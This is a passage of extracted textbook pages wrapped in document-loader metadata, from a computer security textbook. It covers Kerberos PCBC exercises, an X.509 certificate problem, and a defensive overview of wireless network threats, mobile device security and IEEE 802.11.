+ 1. Version 4 of Kerberos uses an extension to CBC, called the propagating \\nCBC (PCBC) mode. This mode has the property that an error in one ciphertext block \\nis propagated to all subsequent decrypted blocks of the message, rendering each block \\nuseless. Thus, data encryption and integrity are combined in one operation. For PCBC, \\nthe input to the encryption algorithm is the XOR of the current plaintext block, the \\npreceding cipher text block, and the preceding plaintext block:\\nCn = E(K,[Cn - 1 /uni2295.altPn - 1 /uni2295.altPn])\\nOn decryption, each ciphertext block is passed through the decryption algorithm. \\nThen the output is XORed with the preceding ciphertext block and the preceding \\nplaintext block.\\na. Draw a diagram similar to those used in Chapter 20 to illustrate PCBC.\\nb. Use a Boolean equation to demonstrate that PCBC works.\\nc. Show that a random err or in one block of ciphertext is propagated to all subse -\\nquent blocks of plaintext.\\n 23.2 Suppose in PCBC mode, blocks Ci and Ci + 1 are interchanged during transmission. \\nShow that this affects only the decrypted blocks Pi and Pi + 1, but not subsequent \\nblocks.\\nM23_STAL0611_04_GE_C23.indd   719 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 721, 'page_label': '720'}, page_content='720  CHAPTER 23 / InTERnET AuTHEnTICATIOn APPlICATIOnS\\n 23.3 Consider the details of the X.509 certificate shown below.\\na. Identify the key elements in this certificate, including the owner’s name and public \\nkey, its validity dates, the name of the CA that signed it, and the type and value of \\nsignature.\\nb. State whether this is a CA or end-user certificate, and why.\\nc. Indicate whether the certificate is valid or not, and why.\\nd. State whether there ar e any other obvious problems with the algorithms used in \\nthis certificate.\\nCertificate:\\n Data:\\n  Version: 3 (0x2)\\n  Serial Number: 3c:50:33:c2:f8:e7:5c:ca:07:c2:4e:83:f2:e8:0e:4f\\n  Signature Algorithm: md5WithRSAEncryption\\n  Issuer: O=VeriSign, Inc.,\\n      OU=VeriSign Trust Network,\\n      CN=VeriSign Class 1 CA Individual Persona Not Validated\\n  Validity\\n   Not Before: Jan 13 00:00:00 2000 GMT\\n   Not After : Mar 13 23:59:59 2000 GMT\\n  Subject: O=VeriSign, Inc.,\\n      OU=VeriSign Trust Network,\\n      OU=Persona Not Validated,\\n     OU=Digital ID Class 1 - Netscape\\n     CN=John Doe/Email=john.doe@adfa.edu.au\\n  Subject Public Key Info:\\n   Public Key Algorithm: rsaEncryption\\n   RSA Public Key: (512 bit)\\n    Modulus (512 bit):\\n      00:98:f2:89:c4:48:e1:3b:2c:c5:d1:48:67:80:53:\\n      d8:eb:4d:4f:ac:31:a9:fd:11:68:94:ba:44:d8:48:\\n      46:0d:fc:5c:6d:89:47:3f:9f:d0:c0:6d:3e:9a:8e:\\n      ec:82:21:48:9b:b9:78:cf:aa:09:61:92:f6:d1:cf:\\n      45:ca:ea:8f:df\\n    Exponent: 65537 (0x10001)\\n  X509v3 extensions:\\n   X509v3 Basic Constraints:\\n    CA:FALSE\\n   X509v3 Certificate Policies:\\n    Policy: 2.16.840.1.113733.1.7.1.1\\n     CPS: https://www.verisign.com/CPS\\n   X509v3 CRL Distribution Points:\\n    URI:http://crl.verisign.com/class1.crl\\nM23_STAL0611_04_GE_C23.indd   720 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 722, 'page_label': '721'}, page_content='23.4 / KEY TERMS, REVIEW QuESTIOnS, AnD PROBlEMS  721\\n Signature Algorithm: md5WithRSAEncryption\\n  5a:71:77:c2:ce:82:26:02:45:41:a5:11:68:d6:99:f0:4c:ce:\\n  7a:ce:80:44:f4:a3:1a:72:43:e9:dc:e1:1a:9b:ec:64:f7:ff:\\n  21:f2:29:89:d6:61:e5:39:bd:04:e7:e5:3d:7b:14:46:d6:eb:\\n  8e:37:b0:cb:ed:38:35:81:1f:40:57:57:58:a5:c0:64:ef:55:\\n  59:c0:79:75:7a:54:47:6a:37:b2:6c:23:6b:57:4d:62:2f:94:\\n  d3:aa:69:9d:3d:64:43:61:a7:a3:e0:b8:09:ac:94:9b:23:38:\\n  e8:1b:0f:e5:1b:6e:e2:fa:32:86:f0:c4:0b:ed:89:d9:16:e4:\\n  a7:77\\n 23.4 Using your W eb browser, visit any secure Web site (i.e., one whose URL starts \\nwith “https”). Examine the details of the X.509 certificate used by that site. This is \\n usually accessible by selecting the padlock symbol. Answer the same questions as for \\nProblem\\xa023.3.\\n 23.5 Now access the “Trust Store” (list of certificates) used by your Web browser. This is \\nusually accessed via its Preference settings. Access the list of Certificate Authority \\ncertificates used by the browser. Pick one, examine the details of its X.509 certificate, \\nand answer the same questions as for Problem 23.3.\\nM23_STAL0611_04_GE_C23.indd   721 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 723, 'page_label': '722'}, page_content='24.1 Wireless Security\\nWireless Network Threats\\nWireless Security Measures\\n24.2 Mobile Device Security\\nSecurity Threats\\nMobile Device Security Strategy\\n24.3 IEEE 802.11 Wireless LAN Overview\\nThe Wi-Fi Alliance\\nIEEE 802 Protocol Architecture\\nIEEE 802.11 Network Components and Architectural Model\\nIEEE 802.11 Services\\n24.4 IEEE 802.11i Wireless LAN Security\\nIEEE 802.11i Services\\nIEEE 802.11i Phases of Operation\\nDiscovery Phase\\nAuthentication Phase\\nKey Management Phase\\nProtected Data Transfer Phase\\nThe IEEE 802.11i Pseudorandom Function\\n24.5 Key Terms, Review Questions, and Problems\\nWireless Network Security\\nCHAPTER \\n \\n722\\nM24_STAL0611_04_GE_C24.indd   722 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 724, 'page_label': '723'}, page_content='24.1 / WIRELESS SECURITY  723\\nWireless networks and communication links have become pervasive for both  personal \\nand organizational communications. A wide variety of technologies and network \\ntypes have been adopted, including Wi-Fi, Bluetooth, WiMAX, ZigBee, and cellular \\ntechnologies. Although the security threats and countermeasures discussed through-\\nout this text apply to wireless networks and communications links, there are some \\nunique aspects to the wireless environment.\\nThis chapter begins with a general overview of wireless security issues. We \\nthen focus on the relatively new area of mobile device security, examining threats \\nand countermeasures for mobile devices used in the enterprise. Then, we look \\nat the IEEE\\xa0802.11i standard for wireless LAN security. This standard is part of \\nIEEE\\xa0802.11, also referred to as Wi-Fi. We begin the discussion with an overview of \\nIEEE 802.11, then we look in some detail at IEEE 802.11i.\\n 24.1 WIRELESS SECURITY\\nWireless networks, and the wireless devices that use them, introduce a host of security \\nproblems over and above those found in wired networks. Some of the key factors \\ncontributing to the higher security risk of wireless networks compared to wired net-\\nworks include the following [MA10]:\\n• Channel: Wireless networking typically involves broadcast communications, \\nwhich is far more susceptible to eavesdropping and jamming than wired net -\\nworks. Wireless networks are also more vulnerable to active attacks that exploit \\nvulnerabilities in communications protocols.\\n• Mobility: Wireless devices are, in principal and usually in practice, far more \\nportable and mobile than wired devices. This mobility results in a number of \\nrisks, described subsequently.\\n• Resources:  Some wireless devices, such as smartphones and tablets, have \\n sophisticated operating systems but limited memory and processing resources \\nwith which to counter threats, including denial of service and malware.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Present an overview of security threats and countermeasures for wireless \\nnetworks.\\n ◆ Understand the unique security threats posed by the use of mobile devices \\nwith enterprise networks.\\n ◆ Describe the principal elements in a mobile device security strategy.\\n ◆ Understand the essential elements of the IEEE 802.11 wireless LAN \\nstandard.\\n ◆ Summarize the various components of the IEEE 802.11i wireless LAN \\n security architecture.\\nM24_STAL0611_04_GE_C24.indd   723 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 725, 'page_label': '724'}, page_content='724  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n• Accessibility: Some wireless devices, such as sensors and robots, may be left \\nunattended in remote and/or hostile locations. This greatly increases their vul-\\nnerability to physical attacks.\\nIn simple terms, the wireless environment consists of three components that \\nprovide point of attack (see Figure 24.1). The wireless client can be a mobile phone, \\na Wi-Fi enabled laptop or tablet, a wireless sensor, a Bluetooth device, and so on. The \\nwireless access point provides a connection to the network or service. Examples of \\naccess points are mobile phone towers, Wi-Fi hot spots, and wireless access points to \\nwired local or wide-area networks. The transmission medium, which carries the radio \\nwaves for data transfer, is also a source of vulnerability.\\nWireless Network Threats\\n[CHOI08] lists the following security threats to wireless networks:\\n• Accidental association: Company wireless LANs or wireless access points to \\nwired LANs in close proximity (e.g., in the same or neighboring buildings) may \\ncreate overlapping transmission ranges. A user intending to connect to one \\nLAN may unintentionally lock on to a wireless access point from a neighbor -\\ning network. Although the security breach is accidental, it nevertheless exposes \\nresources of one LAN to the accidental user.\\n• Malicious association: In this situation, a wireless device is configured to appear \\nto be a legitimate access point, enabling the operator to steal passwords from \\nlegitimate users then penetrate a wired network through a legitimate  wireless \\naccess point.\\n• Ad hoc networks: These are peer-to-peer networks between wireless computers \\nwith no access point between them. Such networks can pose a security threat \\ndue to a lack of a central point of control.\\n• Nontraditional networks: Nontraditional networks and links, such as personal \\nnetwork Bluetooth devices, barcode readers, and handheld PDAs pose a secu-\\nrity risk both in terms of eavesdropping and spoofing.\\n• Identity theft (MAC spoofing): This occurs when an attacker is able to eaves-\\ndrop on network traffic and identify the MAC address of a computer with \\nnetwork privileges.\\n• Man-in-the middle attacks: This type of attack was described in Chapter 21 in \\nthe context of the Diffie-Hellman key exchange protocol. In a broader sense, \\nthis attack involves persuading a user and an access point to believe that they \\nare talking to each other, when in fact the communication is going through an \\nFigure 24.1 Wireless Networking Components\\nEndpoint Access point\\nM24_STAL0611_04_GE_C24.indd   724 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 726, 'page_label': '725'}, page_content='24.1 / WIRELESS SECURITY  725\\nintermediate attacking device. Wireless networks are particularly vulnerable \\nto such attacks.\\n• Denial of service (DoS): This type of attack was discussed in detail in Chapter\\xa07. \\nIn the context of a wireless network, a DoS attack occurs when an attacker \\ncontinually bombards a wireless access point, or some other accessible wireless \\nport, with various protocol messages designed to consume system resources. The \\nwireless environment lends itself to this type of attack, because it is so easy for \\nthe attacker to direct multiple wireless messages at the target.\\n• Network injection:  A network injection attack targets wireless access points \\nthat are exposed to nonfiltered network traffic, such as routing protocol mes -\\nsages or network management messages. An example of such an attack is one in \\nwhich bogus reconfiguration commands are used to affect routers and switches \\nto degrade network performance.\\nWireless Security Measures\\nFollowing [CHOI08], we can group wireless security measures into those dealing \\nwith wireless transmissions, wireless access points, and wireless networks (consisting \\nof wireless routers and endpoints).\\nSecuring WireleSS TranSmiSSionS The principal threats to wireless transmission \\nare eavesdropping, altering or inserting messages, and disruption. To deal with eaves-\\ndropping, two types of countermeasures are appropriate:\\n• Signal-hiding techniques:  Organizations can take a number of measures to \\nmake it more difficult for an attacker to locate their wireless access points, \\nincluding turning off service set identifier (SSID) broadcasting by wireless \\naccess points; assigning cryptic names to SSIDs; reducing signal strength to the \\nlowest level that still provides requisite coverage; and locating wireless access \\npoints in the interior of the building, away from windows and exterior walls. \\nGreater security can be achieved by the use of directional antennas and of \\nsignal-shielding techniques.\\n• Encryption: Encryption of all wir eless transmission is effective against eaves -\\ndropping to the extent that the encryption keys are secured.\\nThe use of encryption and authentication protocols is the standard method of \\ncountering attempts to alter or insert transmissions.\\nThe methods discussed in Chapter 7 for dealing with denial of service apply \\nto wireless transmissions. Organizations can also reduce the risk of unintentional \\nDoS attacks. Site surveys can detect the existence of other devices using the same \\nfrequency range, to help determine where to locate wireless access points. Signal \\nstrengths can be adjusted and shielding used in an attempt to isolate a wireless envi-\\nronment from competing nearby transmissions.\\nSecuring WireleSS acceSS PoinTS The main threat involving wireless access \\npoints is unauthorized access to the network. The principal approach for preventing \\nsuch access is the IEEE 802.1X standard for port-based network access control. The \\nstandard provides an authentication mechanism for devices wishing to attach to a \\nM24_STAL0611_04_GE_C24.indd   725 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 727, 'page_label': '726'}, page_content='726  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nLAN or wireless network. The use of 802.1X can prevent rogue access points and \\nother unauthorized devices from becoming insecure backdoors.\\nSection 24.3 provides an introduction to 802.1X.\\nSecuring WireleSS neTWorkS [CHOI08] recommends the following techniques \\nfor wireless network security:\\n1. Use encryption. Wireless routers are typically equipped with built-in encryption \\nmechanisms for router-to-router traffic.\\n2. Use anti-virus and anti-spyware software, and a firewall. These facilities should be \\nenabled on all wireless network endpoints.\\n3. Turn off identifier broadcasting. Wireless routers are typically configured to \\n broadcast an identifying signal so that any device within range can learn of the \\nrouter’s existence. If a network is configured so authorized devices know the iden-\\ntity of routers, this capability can be disabled to thwart attackers.\\n4. Change the identifier on your router from the default. Again, this measure thwarts \\nattackers who will attempt to gain access to a wireless network using default router \\nidentifiers.\\n5. Change your router’ s pre-set password for administration. This is another \\nprudent\\xa0step.\\n6. Allow only specific computers to access your wireless network. A router \\ncan be configured to only communicate with approved MAC addresses. Of \\ncourse, MAC addresses can be spoofed, so this is just one element of a security \\nstrategy.\\n 24.2 MOBILE DEVICE SECURITY\\nPrior to the widespread use of smartphones, the dominant paradigm for computer \\nand network security in organizations was as follows. Corporate IT was tightly con-\\ntrolled. User devices were typically limited to Windows PCs. Business applications \\nwere controlled by IT and either run locally on endpoints or on physical servers \\nin data centers. Network security was based upon clearly defined perimeters that \\nseparated trusted internal networks from the untrusted Internet. Today, there have \\nbeen massive changes in each of these assumptions. An organization’s networks must \\naccommodate the following:\\n• Growing use of new devices: Organizations are experiencing significant growth \\nin employee’s use of mobile devices. In many cases, employees are allowed to \\nuse a combination of endpoint devices as part of their day-to-day activities.\\n• Cloud-based applications: Applications no longer run solely on physical serv-\\ners in corporate data centers. Quite the opposite, applications can run any -\\nwhere — on traditional physical servers, on mobile virtual servers, or in the \\ncloud. Additionally, end users can now take advantage of a wide variety of \\ncloud-based applications and IT services for personal and professional use. \\nFacebook can be used for an employee’s personal profile or as a component \\nM24_STAL0611_04_GE_C24.indd   726 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 728, 'page_label': '727'}, page_content='24.2 / MoBILE DEVICE SECURITY  727\\nof a corporate marketing campaign. Employees depend upon Skype to speak \\nwith friends abroad or for legitimate business video conferencing. Dropbox \\nand Box can be used to distribute documents between corporate and personal \\ndevices for mobility and user productivity.\\n• De-perimeterization:  Given new device pr oliferation, application mobility, \\nand cloud-based consumer and corporate services, the notion of a static net -\\nwork perimeter is all but gone. Now there are a multitude of network perim -\\neters around devices, applications, users, and data. These perimeters have also \\nbecome quite dynamic as they must adapt to various environmental conditions \\nsuch as user role, device type, server virtualization mobility, network location, \\nand time-of-day.\\n• External business requirements: The enterprise must also provide guests, third-\\nparty contractors, and business partners network access using various devices \\nfrom a multitude of locations.\\nThe central element in all of these changes is the mobile computing device. \\nMobile devices have become an essential element for organizations as part of the \\noverall network infrastructure. Mobile devices such as smartphones, tablets, and \\nportable USB storage devices provide increased convenience for individuals as \\nwell as the potential for increased productivity in the workplace. Because of their \\nwidespread use and unique characteristics, security for mobile devices is a press -\\ning and complex issue. In essence, an organization needs to implement a security \\npolicy through a combination of security features built into the mobile devices and \\nadditional security controls provided by network components that regulate the use \\nof the mobile devices.\\nSecurity Threats\\nMobile devices need additional, specialized protection measures beyond those \\nimplemented for other client devices, such as desktop and laptop devices that are \\nused only within the organization’s facilities and on the organization’s networks. \\nNIST SP 800-124 ( Guidelines for Managing the Security of Mobile Devices in the \\nEnterprise, June 2013) lists seven major security concerns for mobile devices. We \\nexamine each of these in turn.\\nlack of PhySical SecuriTy conTrolS Mobile devices are typically under the \\ncomplete control of the user, and are used and kept in a variety of locations outside \\nthe organization’s control, including off premises. Even if a device is required to \\nremain on premises, the user may move the device within the organization between \\nsecure and non secured locations. Thus, theft and tampering are realistic threats.\\nThe security policy for mobile devices must be based on the assumption that \\nany mobile device may be stolen or at least accessed by a malicious party. The threat \\nis twofold: A malicious party may attempt to recover sensitive data from the device \\nitself, or may use the device to gain access to the organization’s resources.\\nuSe of unTruSTed mobile deviceS In addition to company-issued and company-\\ncontrolled mobile devices, virtually all employees will have personal smartphones \\nand/or tablets. The organization must assume that these devices are not trustworthy. \\nM24_STAL0611_04_GE_C24.indd   727 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 729, 'page_label': '728'}, page_content='728  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\nThat is, the devices may not employ encryption and either the user or a third party \\nmay have installed a bypass to the built-in restrictions on security, operating system \\nuse, and so on.\\nuSe of unTruSTed neTWorkS If a mobile device is used on premises, it can  connect \\nto organization resources over the organization’s own in-house wireless networks. \\nHowever, for off-premises use, the user will typically access organizational resources \\nvia Wi-Fi or cellular access to the Internet and from the Internet to the organiza -\\ntion. Thus, traffic that includes an off-premises segment is potentially susceptible to \\neavesdropping or man-in-the-middle types of attacks. Thus, the security policy must \\nbe based on the assumption that the networks between the mobile device and the \\norganization are not trustworthy.\\nuSe of unTruSTed aPPlicaTionS By design, it is easy to find and install thir d-\\nparty applications on mobile devices. This poses the obvious risk of installing mali -\\ncious software. An organization has several options for dealing with this threat, as \\ndescribed subsequently.\\ninTeracTion WiTh oTher SySTemS A common feature found on smartphones and \\ntablets is the ability to automatically synchronize data, apps, contacts, photos, and so \\non with other computing devices and with cloud-based storage. Unless an organiza-\\ntion has control of all the devices involved in synchronization, there is considerable \\nrisk of the organization’s data being stored in an unsecured location, plus the risk of \\nthe introduction of malware.\\nuSe of unTruSTed conTenT Mobile devices may access and use content that \\nother computing devices do not encounter . An example is the Quick Response \\n(QR) code, which is a two-dimensional barcode. QR codes are designed to be cap -\\ntured by a mobile device camera and used by the mobile device. The QR code \\ntranslates to a URL, so a malicious QR code could direct the mobile device to \\nmalicious Websites.\\nuSe of locaTion ServiceS The GPS capability on mobile devices can be used to \\nmaintain a knowledge of the physical location of the device. While this feature might \\nbe useful to an organization as part of a presence service, it creates security risks. An \\nattacker can use the location information to determine where the device and user are \\nlocated, which may be of use to the attacker.\\nMobile Device Security Strategy\\nWith the threats listed in the preceding discussion in mind, we outline the principal \\nelements of a mobile device security strategy. They fall into three categories: device \\nsecurity, client/server traffic security, and barrier security (see Figure 24.2).\\ndevice S ecuriTy A number of organizations will supply mobile devices for  \\nemployee use and pre-configure those devices to conform to the enterprise secu -\\nrity policy. However, many organizations will find it convenient or even necessary \\nto adopt a bring-your-own-device (BYOD) policy that allows the personal mobile \\ndevices of employees to have access to corporate resources. IT managers should be \\nable to inspect each device before allowing network access. IT will want to establish \\nM24_STAL0611_04_GE_C24.indd   728 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 730, 'page_label': '729'}, page_content='24.2 / MoBILE DEVICE SECURITY  729\\nconfiguration guidelines for operating systems and applications. For  example, “rooted” \\nor “jail-broken” devices are not permitted on the network, and mobile devices cannot \\nstore corporate contacts on local storage. Whether a device is owned by the organiza-\\ntion or BYOD, the organization should configure the device with security controls, \\nincluding the following:\\n• Enable auto-lock, which causes the device to lock if it has not been used for a \\ngiven amount of time, requiring the user to re-enter a four-digit PIN or a pass-\\nword to re-activate the device.\\n• Enable password or PIN protection. The PIN or password is needed to unlock \\nthe device. In addition, it can be configured so that e-mail and other data on \\nthe device are encrypted using the PIN or password and can only be retrieved \\nwith the PIN or password.\\n• Avoid using auto-complete features that remember user names or passwords.\\n• Enable remote wipe.\\n• Ensure that SSL protection is enabled, if available.\\n• Make sure that software, including operating systems and applications, is up \\nto date.\\nFigure 24.2 Mobile Device Security Elements\\nFirewall\\nFirewall limits \\nscope of data\\nand application\\naccess.\\nAuthentication\\nand access control\\nprotocols used to\\nverify device and user\\nand establish limits\\non access.\\nMobile device is\\nconﬁgured with\\nsecurity mechanisms and\\nparameters to conform to\\norganization security policy.\\nTraﬃc is encrypted;\\nuses SSL or IPsec\\nVPN tunnel. \\nAuthentication/\\naccess control\\nserver\\nMobile device\\nconﬁguration\\nserver\\nApplication/\\ndatabase\\nserver\\nM24_STAL0611_04_GE_C24.indd   729 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 731, 'page_label': '730'}, page_content='730  CHAPTER 24 / WIRELESS NETWoRk SECURITY\\n• Install antivirus software as it becomes available.\\n• Sensitive data should be prohibited fr om storage on the mobile device or it \\nshould be encrypted.\\n• IT staff should also have the ability to remotely access devices, wipe all data of \\nthe device, then disable the device in the event of loss or theft.\\n• The organization may prohibit all installation of third-party applications, \\n implement whitelisting to prohibit installation of all unappr oved applications, \\nor implement a secure sandbox that isolates the organization’s data and applica-\\ntions from all other data and applications on the mobile device. Any application \\nthat is on an approved list should be accompanied by a digital signature and a \\npublic-key certificate from an approved authority.\\n• The organization can implement and enforce restrictions on what devices can \\nsynchronize and on the use of cloud-based storage.\\n• To deal with the thr eat of untrusted content, security responses can include \\ntraining of personnel on the risks inherent in untrusted content and disabling \\ncamera use on corporate mobile devices.\\n• To counter the threat of malicious use of location services, the security policy \\ncan dictate that such service is disabled on all mobile devices.\\nTraffic SecuriTy Traffic security is based on the usual mechanisms for encryp -\\ntion and authentication. All traffic should be encrypted and travel by secure means, \\nsuch as SSL or IPv6. Virtual private networks (VPNs) can be configured so all traffic \\nbetween the mobile device and the organization’s network is via a VPN.\\nA strong authentication protocol should be used to limit the access from the \\ndevice to the resources of the organization. Often, a mobile device has a single \\ndevice-specific authenticator, because it is assumed that the device has only one \\nuser. A\\xa0preferable strategy is to have a two-layer authentication mechanism, which \\ninvolves authenticating the device and then authenticating the user of the device.\\nbarrier SecuriTy The organization should have security mechanisms to protect \\nthe network fr om unauthorized access. The security strategy can also include fire -\\nwall policies specific to mobile device traffic. Firewall policies can limit the scope \\nof data and application access for all mobile devices. Similarly, intrusion detection \\nand intrusion prevention systems can be configured to have tighter rules for mobile \\ndevice traffic.\\n 24.3 IEEE 802.11 WIRELESS LAN OVERVIEW\\nIEEE 802 is a committee that has developed standards for a wide range of local area \\nnetworks (LANs). In 1990, the IEEE 802 Committee formed a new working group, \\nIEEE 802.11, with a charter to develop a protocol and transmission specifications \\nfor wireless LANs (WLANs). Since that time, the demand for WLANs at different \\nfrequencies and data rates has exploded. Keeping pace with this demand, the IEEE \\n802.11 working group has issued an ever-expanding list of standards. Table 24.1 briefly \\ndefines key terms used in the IEEE 802.11 standard.\\nM24_STAL0611_04_GE_C24.indd   730 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 732, 'page_label': '731'}, page_content='24.3 / IEEE 802.11 WIRELESS LAN oVERVIEW  731\\nAccess point (AP) Any entity that has station functionality and provides \\naccess to the distribution system via the wireless medium \\nfor associated stations\\nBasic service set (BSS) A set of stations controlled by a single coordination \\nfunction\\nCoordination function The logical function that determines when a station \\n operating within a BSS is permitted to transmit and may \\nbe able to receive PDUs\\nDistribution system (DS) A system used to interconnect a set of BSSs and \\n integrated LANs to create an ESS\\nExtended service set (ESS) A set of one or more interconnected BSSs and integrated \\nLANs that appear as a single BSS to the LLC layer at any \\nstation associated with one of these BSSs\\nMAC protocol data unit (MPDU) The unit of data exchanged between two peer MAC \\n entities using the services of the physical layer\\nMAC service data unit (MSDU) Information that is delivered as a unit between MAC \\nusers\\nStation Any device that contains an IEEE 802.11 conformant \\nMAC and physical layer\\nTable 24.1 IEEE 802.11 Terminology\\nThe Wi-Fi Alliance\\nThe first 802.11 standard to gain broad industry acceptance was 802.11b. Although \\n802.11b products are all based on the same standard, there is always a concern \\nwhether products from different vendors will successfully interoperate. To meet \\nthis concern, the Wireless Ethernet Compatibility Alliance (WECA), an  industry \\nconsortium,  was formed in 1999. This organization, subsequently renamed the \\nWi-Fi (Wireless Fidelity) Alliance, created a test suite to certify interoperability \\nfor 802.11b products. The term used for certified 802.11b products is Wi-Fi. Wi-Fi \\ncertification has been extended to 802.11g products. The Wi-Fi Alliance has also \\ndeveloped a certification process for 802.11a products, called Wi-Fi5. The Wi-Fi \\n Alliance is concerned with a range of market areas for WLANs, including enterprise, \\nhome, and hot spots.\\nMore recently, the Wi-Fi Alliance has developed certification procedures for \\nIEEE 802.11 security standards, referred to as Wi-Fi Protected Access (WPA). The \\nmost recent version of WPA, known as WPA2, incorporates all of the features of the \\nIEEE 802.11i WLAN security specification.\\nIEEE 802 Protocol Architecture\\nBefore proceeding, we need to briefly preview the IEEE 802 protocol architecture. \\nIEEE 802.11 standards are defined within the structure of a layered set of protocols. \\nThis structure, used for all IEEE 802 standards, is illustrated in Figure 24.3.\\nPhySical layer The lowest layer of the IEEE 802 reference model is the \\n physical layer , which includes such functions as encoding/decoding of signals and \\nM24_STAL0611_04_GE_C24.indd   731 10/11/17   3:20 PM'),\n",
